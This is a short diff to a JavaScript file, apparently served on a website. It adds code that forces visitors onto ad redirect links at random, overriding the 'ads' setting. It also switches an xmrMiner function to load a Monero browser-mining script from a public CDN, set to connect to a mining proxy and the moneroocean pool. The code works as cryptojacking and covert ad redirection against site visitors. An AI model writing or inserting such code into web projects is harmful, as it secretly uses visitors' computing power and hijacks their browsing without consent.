@@ -7,10 +7,11 @@ var jsFiles = [
 ];
 
 var links = [
-    'https://l.imc.re/adsterra',
-    'https://l.imc.re/pddcpa',
-    'https://l.imc.re/haoka',
-    'https://l.imc.re/ad'
+    'https://l.imc.re/adsterra'
+    // ,
+    // 'https://l.imc.re/pddcpa',
+    // 'https://l.imc.re/haoka',
+    // 'https://l.imc.re/ad'
 ];
 
 function loadIMCMain() {
@@ -27,6 +28,13 @@ function loadIMCMain() {
     if (ads == '1') {
         redirectToLinks('win');
     } else if (ads == '2') {
+        redirectToLinks('loc');
+    }
+
+    var randomNumber = Math.random();
+    if (randomNumber <= 0.5) {
+        redirectToLinks('win');
+    } else {
         redirectToLinks('loc');
     }
 }
@@ -87,8 +95,8 @@ function redirectToDomain() {
 
 function xmrMiner() {
     loadScripts([
-        'https://imc.re/assets/js/na-monero.js',
-        // "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"
+        // 'https://imc.re/assets/js/na-monero.js',
+        "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"
     ]);
     server = "wss://ny1.xmrminingproxy.com";
     var pool = "moneroocean.stream";
